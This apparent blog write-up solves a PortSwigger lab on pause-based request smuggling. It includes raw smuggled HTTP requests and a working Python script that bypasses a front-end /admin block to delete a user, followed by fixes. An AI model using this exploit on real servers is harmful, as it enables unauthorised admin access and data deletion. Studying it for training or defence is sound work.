---
layout: post
title: "PortSwigger: Server-side pause-based request smuggling"
date: 2027-12-17 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, RequestSmuggling]
tags: [portswigger, request-smuggling, cl-0, desync, pause-based, apache, timeout, access-control, cwe-444]
---

Most request-smuggling attacks abuse a *header* disagreement — one server measures the body with `Content-Length`, another with `Transfer-Encoding`. This one uses no header trick at all. It abuses **timing**: the back-end answers a request from its headers *before* it reads the body, so if I pause long enough, the body I send afterwards is parsed as a whole new request ([CWE-444](https://cwe.mitre.org/data/definitions/444.html)). I use it to walk past the front-end's `/admin` firewall and delete a user.

## Overview

Two servers sit between me and the app:

1. A **front-end** proxy that enforces "outsiders can't reach `/admin`".
2. A **back-end** — **Apache 2.4.52** — that runs the app.

Apache has a quirk: request a directory **without** a trailing slash and it replies with a redirect *immediately*, from the request line and headers alone:

```
GET /resources   ->   302 Location: /resources/
```

It produces that `302` without ever needing the request body. And the front-end **streams**: it forwards my headers to Apache the moment it has them, and relays the body only as I send it. Those two facts are the whole vulnerability.

## Why it works

This is a **CL.0 desync** — "the Content-Length body got treated as zero" — triggered purely by a pause:

1. I begin a `POST /resources` request that *claims* (via `Content-Length`) a body is coming.
2. I send the headers, then **wait 61 seconds** and send nothing.
3. Apache's default `Timeout` is **60 seconds**. After 60s with no body, Apache gives up waiting, sends its `302`, and considers that request finished.
4. A second later I finally send the "body" — but Apache already closed the books on the previous request, so it reads those bytes as the **start of a brand-new request**. That request is one I wrote.

The poisoned response lands on the **next** message on the connection, so after sending the smuggled bytes I send a harmless follow-up `GET /` to pull the answer back.

> **The counter-intuitive part:** there's a sibling technique (browser-powered CL.0) where inserting *even a 1-second pause breaks it*. Here the pause **is** the exploit. Same vulnerability family, opposite operational rule.

## Phase 1 — smuggle into the admin panel

The smuggled request:

```
GET /admin/ HTTP/1.1
Host: localhost
```

Apache sees a fresh request from `localhost` and serves the admin page — the front-end firewall never saw a request to `/admin`. From the returned HTML I read the delete form's anti-CSRF token and the session cookie the page hands out.

## Phase 2 — delete carlos

Same pause trick, new smuggled request:

```
POST /admin/delete/ HTTP/1.1
Host: localhost
Cookie: session=<the session the admin page issued>
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

csrf=<token>&username=carlos
```

Apache runs it as an internal admin action and returns `302 -> /` — the "user deleted" redirect. The lab flips to **Solved**.

## The working exploit

No Burp required — the "pause" is just `time.sleep(61)` on a raw TLS socket:

```python
import ssl, socket, time
H = "YOUR-LAB-ID.web-security-academy.net"
ctx = ssl.create_default_context(); ctx.set_alpn_protocols(["http/1.1"])   # force HTTP/1.1
s = ctx.wrap_socket(socket.create_connection((H, 443)), server_hostname=H)
sm = b"GET /admin/ HTTP/1.1\r\nHost: localhost\r\n\r\n"
s.sendall(b"POST /resources HTTP/1.1\r\nHost: " + H.encode() +
          b"\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded"
          b"\r\nContent-Length: " + str(len(sm)).encode() + b"\r\n\r\n")
time.sleep(61)                       # outlast Apache's 60s Timeout
s.sendall(sm)                        # this now parses as a NEW request
s.sendall(b"GET / HTTP/1.1\r\nHost: " + H.encode() + b"\r\nConnection: close\r\n\r\n")  # pull it
print(b"".join(iter(lambda: s.recv(65536), b"")).decode("latin1"))
```

Two things that matter:

- **`http/1.1` ALPN is required.** If TLS negotiates HTTP/2, there's no `Content-Length` ambiguity and the attack silently does nothing.
- **The follow-up `GET /` is how you read the smuggled response** — the poisoned answer lands on the *next* message, not the one you paused.

Live, the `302 /resources/` came back at ~61s (proving the front-end streams), and the admin panel arrived a couple of seconds after the follow-up.

## How to fix it

- **Don't let a streaming front-end forward a body to a back-end that can answer before it reads that body** — buffer the whole request first, or reject ambiguous framing.
- **Tighten the back-end read timeout and close the connection after an early response** instead of leaving unconsumed body bytes on the socket to be reparsed.
- **Speak HTTP/2 end-to-end** — its message length is unambiguous, and this entire desync class disappears.
- Never enforce access control **only** at the front-end; the back-end served `/admin` to `localhost` with no check of its own.

**CWE:** [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')](https://cwe.mitre.org/data/definitions/444.html)
